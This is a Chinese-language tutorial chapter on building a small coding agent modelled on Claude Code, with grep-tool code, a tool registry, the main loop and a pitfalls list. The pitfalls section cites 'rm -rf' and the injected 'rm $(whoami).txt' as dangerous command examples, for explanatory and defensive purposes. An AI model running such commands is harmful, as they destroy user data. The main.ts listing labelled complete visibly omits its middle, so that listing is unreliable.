    bash 跑 grep 命令也能做，但本章的 grep 工具跨平台（Windows 没有原生 grep），且自动跳过 node_modules。

    3.10.2 完整代码¶

    // tools/grep.ts
import * as fs from "fs";
import * as path from "path";

export const grepTool = {
  name: "grep",
  description:
    "在文件中搜索正则表达式。返回匹配的文件名、行号和内容。用于查找代码中的特定模式。",
  input_schema: {
    type: "object" as const,
    properties: {
      pattern: { type: "string", description: "正则表达式模式" },
      include: { type: "string", description: "文件名过滤模式，如 *.ts" },
      cwd: { type: "string", description: "搜索根目录，默认为当前工作目录" },
    },
    required: ["pattern"],
  },
};

function walkDir(dir: string, baseDir: string, results: string[]): void {
  const entries = fs.readdirSync(dir, { withFileTypes: true });
  for (const entry of entries) {
    if (entry.name === "node_modules" || entry.name === ".git") continue;
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      walkDir(fullPath, baseDir, results);
    } else {
      results.push(fullPath);
    }
  }
}

export function executeGrep(input: {
  pattern: string;
  include?: string;
  cwd?: string;
}): string {
  try {
    const baseDir = path.resolve(input.cwd || process.cwd());
    const allFiles: string[] = [];
    walkDir(baseDir, baseDir, allFiles);

    const regex = new RegExp(input.pattern);
    const includeRegex = input.include
      ? new RegExp(
          input.include.replace(/\./g, "\\.").replace(/\*/g, ".*") + "$"
        )
      : null;

    const results: string[] = [];
    let totalMatches = 0;

    for (const filePath of allFiles) {
      if (includeRegex && !includeRegex.test(path.basename(filePath))) continue;

      const content = fs.readFileSync(filePath, "utf-8");
      const lines = content.split("\n");

      for (let i = 0; i < lines.length; i++) {
        if (regex.test(lines[i])) {
          const relPath = path.relative(baseDir, filePath).replace(/\\/g, "/");
          results.push(`${relPath}:${i + 1}: ${lines[i].trim()}`);
          totalMatches++;
          if (totalMatches >= 200) break;
        }
      }
      if (totalMatches >= 200) break;
    }

    if (results.length === 0) {
      return `未找到匹配 "${input.pattern}" 的内容`;
    }
    return results.join("\n") + (totalMatches >= 200 ? "\n\n... (结果已截断)" : "");
  } catch (err: any) {
    return `错误: ${err.message}`;
  }
}

    3.10.3 逐行讲解¶

    第 28–39 行：walkDir - 和 glob 的 walkDir 几乎一样，区别是推全路径而不是相对路径（因为 grep 内部要读文件内容，全路径好读；最后输出时再转相对路径）。 - 注意这段代码和 glob.ts 里有重复。理想情况下应该抽成公共函数 walkDir.ts，但本章为了每个工具自包含，容忍了重复。这是"教学清晰"和"工程 DRY"的取舍。

    第 51 行：new RegExp(input.pattern) - 把模型传的 pattern 编译成正则。模型可以传 "console\\.log"、"function\\s+\\w+" 等。 - 如果 pattern 不合法（比如括号不匹配），RegExp 构造函数会抛异常，被外层 catch 接住返回错误。

    第 52–56 行：include 过滤 - input.include 是文件名模式，比如 "*.ts"。 - 转成正则：.replace(/\./g, "\\.") 转义点，.replace(/\*/g, ".*") 把 * 转成 .*，加 $ 锚尾。 - "*.ts" → "\\..*ts$"... 等等，这里有个 bug 风险：* 应该在 . 前面。实际上 "*.ts" 经过 . 转义变成 "*\.ts"，再经过 * 转义变成 ".*\.ts"，加 $ 变成 ".*\.ts$"，匹配 a.ts、util.ts、src/a.ts 的 basename。没问题。 - path.basename(filePath) 只取文件名部分（src/a.ts → a.ts），用 includeRegex 匹配它。

    第 61–76 行：双重循环 - 外层遍历文件，内层遍历行。 - fs.readFileSync(filePath, "utf-8") 读全文，split("\n") 切行。 - regex.test(lines[i]) 对每一行做正则匹配。 - 匹配中就拼一行结果：relPath:行号: 内容。行号 i + 1 因为数组从 0 开始但行号从 1 开始。 - lines[i].trim() 去掉行首尾空白，让结果紧凑。

    第 72–73 行：200 条截断 - totalMatches >= 200 就 break 内层循环。 - 第 75 行再检查一次 break 外层。两层都要 break，只 break 内层的话外层会继续读下一个文件。

    第 78–81 行：返回结果 - 0 条返回"未找到"。 - 有结果就 join 换行输出。超过 200 条加截断提示。

    3.10.4 结果格式：为什么是 文件名:行号: 内容¶

    这个格式是从 Unix 的 grep 命令抄来的：

    src/main.ts:42: console.log("hello");
src/utils.ts:15: console.log("debug");

    为什么这个格式好？

    1. 模型一眼看出位置：文件名 + 行号，模型要编辑时直接知道改哪里；
    2. 一行一匹配：紧凑，不浪费上下文；
    3. 和工具链兼容：很多编辑器能解析 文件:行号: 内容 格式，点击直接跳转。

    3.10.5 性能考虑¶

    本章的 grep 是最朴素的实现：逐文件读全文，逐行正则匹配。性能瓶颈：

    1. 读文件：每个文件一次 readFileSync，IO 密集。大项目几千文件，串行读要几秒。
    2. 正则匹配：每行一次 regex.test。复杂正则（比如回溯多的）会慢。
    3. 串行：文件一个一个处理，没并行。

    真实 Claude Code 用 ripgrep（rg 命令），它是 Rust 写的，做了几个关键优化：

    • 内存映射（mmap） 读文件，不进用户态；
    • SIMD 加速字符串搜索；
    • 多线程 并行扫文件；
    • 智能跳过 .gitignore 里声明的文件。

    结果：ripgrep 在大项目里比本章实现快 100 倍以上。但原理是一样的：找匹配的行，输出 文件:行号: 内容。先理解朴素版，再理解优化版，学习曲线更平缓。

    3.10.6 常见陷阱¶

    陷阱 现象 解决
    正则特殊字符 搜 console.log 的 . 匹配了 consoleXlog 模型应传 console\.log，或工具加转义选项
    正则不合法 RegExp 抛异常 被 catch 接住，返回错误给模型
    二进制文件 读出来乱码，正则匹配乱串 真实实现会检测二进制并跳过，本章简化了
    大文件 单文件几百万行，读全文爆内存 流式读取 + 逐行匹配，本章简化了

    3.11 工具模块化组织¶

    3.11.1 为什么每个工具一个文件¶

    本章的目录结构：

    ch03-tools-full/
├── main.ts
├── tools/
│   ├── index.ts    # 工具注册表 + 统一执行入口
│   ├── read.ts
│   ├── write.ts
│   ├── edit.ts
│   ├── bash.ts
│   ├── glob.ts
│   └── grep.ts
└── .env.example

    每个工具一个 .ts 文件。为什么？

    好处 1：职责隔离 - edit.ts 只管编辑，bash.ts 只管执行。改 edit 的逻辑不会碰 bash 的代码，不会互相影响。 - 如果全塞一个 tools.ts，几百行挤一起，找个函数要滚半天。

    好处 2：可独立测试 - 想测 edit？只 import edit.ts，不用管其他工具。 - 单文件方案要 import 整个 tools 模块，连带把 bash、glob 都加载了。

    好处 3：易扩展 - 新增工具就新建一个文件，不动现有文件。后面想加 list_dir、rename，新建 list_dir.ts 就行，其他工具毫不知情。

    好处 4：可读性强 - 文件名即职责。看到 bash.ts 就知道是命令执行，看到 grep.ts 就知道是内容搜索，不用打开文件看导出。

    3.11.2 每个工具文件导出什么¶

    每个工具文件导出两样东西：

    // 比如 edit.ts
export const editTool = { ... };        // 1. 工具定义（name + description + schema）
export function executeEdit(input) { ... }  // 2. 执行函数
    • editTool：发给 API 的工具定义，告诉模型"有这个工具、叫这名、要这些参数"。
    • executeEdit：实际执行逻辑，主循环调用它拿到结果。

    为什么分开导出而不合成一个对象？因为 API 要的是"定义数组"，主循环要的是"按名字调函数"，两个消费者需求不同，分开更灵活。

    3.11.3 index.ts — 注册表模式¶

    // tools/index.ts
import type Anthropic from "@anthropic-ai/sdk";
import { readTool, executeRead } from "./read.js";
import { writeTool, executeWrite } from "./write.js";
import { editTool, executeEdit } from "./edit.js";
import { bashTool, executeBash } from "./bash.js";
import { globTool, executeGlob } from "./glob.js";
import { grepTool, executeGrep } from "./grep.js";

export type Tool = Anthropic.Tool;

export const tools: Tool[] = [
  readTool,
  writeTool,
  editTool,
  bashTool,
  globTool,
  grepTool,
];

export async function executeTool(name: string, input: any): Promise<string> {
  switch (name) {
    case "read_file":  return executeRead(input);
    case "write_file": return executeWrite(input);
    case "edit_file":  return executeEdit(input);
    case "bash":       return executeBash(input);
    case "glob":       return executeGlob(input);
    case "grep":       return executeGrep(input);
    default:           return `错误: 未知工具 "${name}"`;
  }
}

    index.ts 做两件事：

    1. 汇总工具定义数组 tools - main.ts 把这个数组发给 API：client.messages.create({ ..., tools })。 - API 看到这个数组，就知道有哪些工具可用。 - 新增工具只要在数组里加一行，改一处就完事。

    2. 统一执行入口 executeTool(name, input) - 主循环拿到模型调用的工具名和参数，调 executeTool(name, input)，它内部 switch 分发到对应的 execute 函数。 - 主循环不用关心"这个工具怎么执行"，只要调 executeTool 就行。分发逻辑集中在一处，好维护。

    3.11.4 为什么用 switch 不用 map¶

    另一种写法是用对象映射：

    const handlers: Record<string, (input: any) => Promise<string>> = {
  read_file: executeRead,
  write_file: executeWrite,
  // ...
};
export async function executeTool(name: string, input: any) {
  const handler = handlers[name];
  return handler ? handler(input) : `错误: 未知工具 "${name}"`;
}

    两种都行。本章用 switch 是因为：

    • switch 更直观，初学者一眼看懂；
    • switch 有 TypeScript 的穷尽性检查优势（配合 union type 时）；
    • 工具数量少（6 个），switch 不会太长。

    工具多到几十个时，map 写法更简洁。这是风格选择，不是对错。

    3.11.5 新增一个工具的完整步骤¶

    假设要加一个 list_dir 工具（列目录内容），步骤：

    1. 新建 tools/list_dir.ts，导出 listDirTool 和 executeListDir；
    2. 在 index.ts 里：
    3. 顶部加 import { listDirTool, executeListDir } from "./list_dir.js";
    4. tools 数组加 listDirTool
    5. executeTool 的 switch 加 case "list_dir": return executeListDir(input);
    6. 完事。main.ts 一行都不用改——它用的是 tools 和 executeTool，这俩自动包含了新工具。

    这就是模块化的好处：新增功能只动新增文件 + 注册表，不碰现有逻辑。

    3.12 main.ts — 主循环¶

    3.12.1 完整代码¶

async function main() {
  console.log("=== Mini Claude Code - Ch3 (full tools) ===");
  console.log(`模型: ${model}`);
  console.log("工具: read_file, write_file, edit_file, bash, glob, grep");
  console.log('输入 "exit" 退出\n');

  while (true) {
    const userInput = await prompt("\n> ");
    if (userInput.trim() === "exit") break;

              const preview = result.slice(0, 200);
              console.log(`  [工具结果] ${preview}${result.length > 200 ? "..." : ""}`);

              toolResults.push({
                type: "tool_result",
                tool_use_id: block.id,
                content: result,
              });
            }
          }

          messages.push({ role: "user", content: toolResults });
        } else {
          const text = extractText(response.content);
          if (text) console.log(text);
          break;
        }
      }
    } catch (err: any) {
      console.error(`[错误] ${err.message}`);
    }
  }

  console.log("再见！");
  rl.close();
}

    3.12.2 关键点讲解¶

    第 4 行：从 index.ts 导入 - main.ts 只依赖 tools 和 executeTool，不直接 import 单个工具文件。这样新增工具 main 不用改。

    第 48–83 行：工具循环 - 外层 while (true) 是"用户输入一轮"循环； - 内层 while (true) 是"模型可能连续调多个工具"循环——模型调一个工具，拿到结果，可能再调一个，直到 stop_reason 不是 tool_use 才结束本轮。

    第 58 行：stop_reason === "tool_use" - API 返回 stop_reason: "tool_use" 表示模型想调工具。此时 response.content 里会有 tool_use 类型的 block。 - 其他 stop_reason（"end_turn"、"max_tokens"）表示模型说完了，提取文本打印，break 内层循环。

    第 61–74 行：执行所有工具调用 - 一次 response 里模型可能调多个工具（并行调用），用 for 循环逐个执行。 - executeTool(block.name, block.input) 是统一入口，它分发到具体工具。 - 结果塞进 toolResults 数组，最后一次性 push 进 messages。不能执行一个 push 一个，因为 API 要求所有 tool_result 在同一个 user message 里。

    第 65–67 行：打印预览 - 工具调用和结果都打印到终端，让用户看到模型在干什么。 - result.slice(0, 200) 只显示前 200 字符，避免长结果刷屏。完整结果已经塞进 messages 给模型了。

    3.13 常见陷阱汇总¶

    把前面分散讲的陷阱集中起来，方便查阅。

    3.13.1 edit_file 匹配失败¶

    症状：模型调 edit_file，工具返回"未找到匹配的文本"。

    原因： 1. 模型记错了文件内容（可能文件被别的工具改过，模型还以为是最初读到的样子）； 2. 缩进不一致（模型用空格，文件用 tab）； 3. 换行符不一致（Windows \r\n，模型传 \n）。

    解决： - 模型应该重新 read_file 拿最新内容再编辑； - 工具内部可以 normalize 换行符再匹配。

    3.13.2 bash 命令注入¶

    症状：模型执行了危险命令，比如 rm -rf 删了文件。

    原因：exec 用 shell 执行，模型传什么都跑。如果用户输入被拼进命令，还有 shell 注入风险（比如 rm $(whoami).txt）。

    解决： - 加命令白名单，只允许安全命令； - 危险命令要用户确认； - 永远在工作目录内操作，禁止 cd /。

    3.13.3 glob 性能¶

    症状：大项目里 glob 要几秒才返回。

    原因：walkDir 串行遍历所有文件，node_modules 虽然跳过了，但 src 下几万文件还是慢。

    解决： - 用 fast-glob 库，它做了并行化和缓存； - 或者边遍历边过滤，不先收集全部再 filter。

    3.13.4 grep 正则错误¶

    症状：模型传了 function\s+\w+ 但工具报"无效正则"。

    原因：JSON 里 \s 要写成 \\s（反斜杠要转义）。模型可能传了单反斜杠，JSON 解析后变成 s，正则就错了。

    解决： - 工具内部 try/catch 接住，返回友好错误； - 模型学会在 JSON 里正确转义反斜杠。

    3.14.3 差距从哪来¶

    本章实现和真实 Claude Code 的差距，不是因为"想不出来"，而是因为"教学优先"。每处简化都是有意的：

    • 用 readFileSync 而不是流——同步代码好读；
    • 用手写 glob 而不是 fast-glob——要讲清原理；
    • 用手写 grep 而不是 ripgrep——避免引入二进制依赖；
    • 不加权限系统——增加复杂度但偏离主题。

    理解了本章的朴素实现，再去看真实 Claude Code 的源码（或任何 AI coding 工具），你会发现核心思路完全一样，只是工程优化更多。这就是"从零实现"的价值——先懂原理，再谈优化。

    3.17 本章小结¶

    这一章我们从"只会说话的模型"走到了"能搜索、能改、能执行的模型"。核心收获：

    1. 六个工具各司其职：read 看、write 建、edit 改、bash 执行、glob 按名找、grep 按内容找。单一职责让每个工具短小可靠。

    2. edit_file 的精确替换 + 唯一匹配是最关键的设计。它让模型用最少的 token 做精确修改，同时用约束换安全——不唯一就拒绝，逼模型提供足够上下文。

    3. bash 是能力最大也最危险的工具。child_process.exec 让模型几乎能做任何事，但生产环境一定要加白名单、确认、审计等防护。

    4. glob 和 grep 的核心都是"遍历 + 匹配"。glob 把模式翻译成正则匹配文件名，grep 用正则匹配文件内容。朴素实现慢但原理清晰，真实工具用 Rust/并行加速。

    5. 模块化组织让新增工具极简单：新建文件 + index.ts 加两行，完事。这是"开闭原则"的体现——对扩展开放，对修改封闭。

    6. 四条设计原则贯穿全章：单一职责、描述清晰、错误友好、结果可控。任何新工具都应对照这四条检查。

    现在模型能干活了，但有个体验问题：输出是"等全部生成再显示"。你问它一个问题，要等几秒才一次性看到答案，中间干等着。下一章我们改成流式输出，让文字逐字逐字显示出来，体验接近真实 Claude Code。
